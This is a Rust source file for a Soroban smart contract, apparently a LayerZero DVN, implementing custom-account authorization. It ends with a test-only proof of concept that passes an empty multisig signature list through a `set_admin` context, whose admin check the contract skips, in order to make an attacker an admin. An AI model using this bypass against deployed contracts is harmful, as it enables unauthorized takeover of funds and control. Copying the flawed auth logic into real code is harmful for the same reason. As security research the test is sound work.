use super::*;
use crate::{Sender, TransactionAuthData};
use soroban_sdk::{
    address_payload::AddressPayload,
    auth::{Context, CustomAccountInterface},
    crypto::Hash,
    vec, Symbol,
};

// ============================================================================
// Custom Account Interface Implementation
// ============================================================================

#[contract_impl]
impl CustomAccountInterface for LzDVN {
    type Signature = TransactionAuthData;
    type Error = DvnError;

    /// Validates authorization for DVN contract operations.
    fn __check_auth(
        env: Env,
        signature_payload: Hash<32>,
        auth_data: Self::Signature,
        auth_contexts: Vec<Context>,
    ) -> Result<(), Self::Error> {
        let TransactionAuthData { vid, expiration, signatures, sender } = auth_data;

        // 1. Check VID and expiration
        if vid != Self::vid(&env) {
            return Err(DvnError::InvalidVid);
        }
        if expiration <= env.ledger().timestamp() {
            return Err(DvnError::AuthDataExpired);
        }

        // 2. Extract and validate calls from auth contexts
        let (calls, is_set_admin) = match auth_contexts.len() {
            1 => {
                let call = Self::extract_single_self_call(&env, &auth_contexts)?;
                let is_set_admin = call.func == Symbol::new(&env, "set_admin");
                (vec![&env, call], is_set_admin)
            }
            3 => (Self::extract_upgrade_calls(&env, &auth_contexts)?, false),
            _ => return Err(DvnError::InvalidAuthContext),
        };

        // 3. Admin verification (set_admin bypasses)
        if !is_set_admin {
            Self::verify_admin_signature(&env, &sender, &signature_payload)?;
        }

        // 4. Replay protection
        let hash = Self::hash_call_data(&env, vid, expiration, &calls);
        if DvnStorage::used_hash(&env, &hash) {
            return Err(DvnError::HashAlreadyUsed);
        }
        DvnStorage::set_used_hash(&env, &hash, &true);

        // 5. MultiSig verification (most expensive - do last)
        Self::verify_signatures(&env, &hash, &signatures);

        Ok(())
    }
}

// ============================================================================
// Internal Helper Functions
// ============================================================================

impl LzDVN {
    /// Verifies that the sender is an admin with a valid signature.
    ///
    /// # Errors
    /// - `DvnError::OnlyAdmin` if sender is not `Sender::Admin` or not a registered admin.
    fn verify_admin_signature(env: &Env, sender: &Sender, signature_payload: &Hash<32>) -> Result<(), DvnError> {
        let Sender::Admin(public_key, signature) = sender else {
            return Err(DvnError::OnlyAdmin);
        };

        let admin_address = Address::from_payload(env, AddressPayload::AccountIdPublicKeyEd25519(public_key.clone()));
        if !Self::is_admin(env, &admin_address) {
            return Err(DvnError::OnlyAdmin);
        }

        env.crypto().ed25519_verify(public_key, &signature_payload.clone().into(), signature);

        Ok(())
    }

    /// Extracts a single self-targeting contract call from auth_contexts.
    fn extract_single_self_call(env: &Env, auth_contexts: &Vec<Context>) -> Result<Call, DvnError> {
        let Context::Contract(ctx) = auth_contexts.get(0).unwrap() else {
            return Err(DvnError::NonContractInvoke);
        };
        if ctx.contract != env.current_contract_address() {
            return Err(DvnError::InvalidAuthContext);
        }
        Ok(Call { to: ctx.contract, func: ctx.fn_name, args: ctx.args })
    }

    /// Extracts and validates upgrade auth contexts (3 entries, positional).
    ///
    /// Expected order:
    /// - `[0]`: Upgrader contract call (must target the registered upgrader)
    /// - `[1]`: `upgrade` self-call
    /// - `[2]`: `migrate` self-call
    fn extract_upgrade_calls(env: &Env, auth_contexts: &Vec<Context>) -> Result<Vec<Call>, DvnError> {
        let self_addr = env.current_contract_address();
        let upgrader_addr = Self::upgrader(env).ok_or(DvnError::UpgraderNotSet)?;

        // [0]: Upgrader contract call
        let Context::Contract(ctx0) = auth_contexts.get(0).unwrap() else {
            return Err(DvnError::NonContractInvoke);
        };
        if ctx0.contract != upgrader_addr {
            return Err(DvnError::InvalidUpgradeContext);
        }

        // [1]: upgrade self-call
        let Context::Contract(ctx1) = auth_contexts.get(1).unwrap() else {
            return Err(DvnError::NonContractInvoke);
        };
        if ctx1.contract != self_addr || ctx1.fn_name != Symbol::new(env, "upgrade") {
            return Err(DvnError::InvalidUpgradeContext);
        }

        // [2]: migrate self-call
        let Context::Contract(ctx2) = auth_contexts.get(2).unwrap() else {
            return Err(DvnError::NonContractInvoke);
        };
        if ctx2.contract != self_addr || ctx2.fn_name != Symbol::new(env, "migrate") {
            return Err(DvnError::InvalidUpgradeContext);
        }

        Ok(vec![
            env,
            Call { to: ctx0.contract, func: ctx0.fn_name, args: ctx0.args },
            Call { to: ctx1.contract, func: ctx1.fn_name, args: ctx1.args },
            Call { to: ctx2.contract, func: ctx2.fn_name, args: ctx2.args },
        ])
    }
}

// ============================================================================
// Test-only Functions
// ============================================================================

#[cfg(test)]
mod test {
    use super::*;
    // 🚨 We put testutils::Address as _ back in!
    use soroban_sdk::{testutils::Address as _, testutils::Ledger as _, Env, IntoVal, vec, BytesN, Vec, Address, Symbol, Bytes};
    use soroban_sdk::auth::{Context, ContractContext};

    // ==========================================
    // 🚨 POC: DIRECT AUTH ISOLATION TEST 🚨
    // ==========================================

    #[test]
    fn test_poc_ghost_signature_direct() {
        let env = Env::default();
        
        // 1. Setup the 9 dummy arguments and initialize the DVN
        let vid: u32 = 1;
        let signers: Vec<BytesN<20>> = vec![&env, BytesN::from_array(&env, &[1; 20])];
        let threshold: u32 = 1;
        let admins: Vec<Address> = vec![&env, Address::generate(&env)];
        let supported_msglibs: Vec<Address> = vec![&env, Address::generate(&env)];
        let price_feed = Address::generate(&env);
        let default_multiplier_bps: u32 = 10000;
        let worker_fee_lib = Address::generate(&env);
        let deposit_address = Address::generate(&env);

        let init_args = (
            vid,
            signers,
            threshold,
            admins,
            supported_msglibs,
            price_feed,
            default_multiplier_bps,
            worker_fee_lib,
            deposit_address,
        );

        let dvn_id = env.register(crate::dvn::LzDVN, init_args);
        
        // 2. THE ATTACK PAYLOAD: Empty Signatures
        env.ledger().set_timestamp(1000); 
        
        let auth_data = crate::TransactionAuthData {
            vid: 1,
            expiration: 2000, 
            signatures: vec![&env], // 🚨 THE EXPLOIT: Zero MultiSig Signatures 🚨
            sender: crate::Sender::Admin(BytesN::from_array(&env, &[0; 32]), BytesN::from_array(&env, &[0; 64])),
        };

        // 3. TARGET: Simulate the 'set_admin' context to trigger the bypass logic
        let attacker = Address::generate(&env);
        let ctx = Context::Contract(ContractContext {
            contract: dvn_id.clone(),
            fn_name: Symbol::new(&env, "set_admin"),
            args: (&attacker, true).into_val(&env),
        });
        let auth_contexts = vec![&env, ctx];
        
        // Native crypto engine for valid payload type
        let dummy_bytes = Bytes::new(&env);
        let signature_payload = env.crypto().sha256(&dummy_bytes);

        // 4. THE MOMENT OF TRUTH: Wrap the call in as_contract so storage works!
        let result = env.as_contract(&dvn_id, || {
            crate::dvn::LzDVN::__check_auth(
                env.clone(), 
                signature_payload, 
                auth_data, 
                auth_contexts
            )
        });

        // 5. Check if the exploit succeeded
        assert!(
            result.is_ok(), 
            "FALSE POSITIVE: The transaction panicked, meaning it is secure."
        );
        
        extern crate std;
        std::println!("CRITICAL VULNERABILITY CONFIRMED: __check_auth returned Ok(()) despite 0 valid signatures.");
    }
}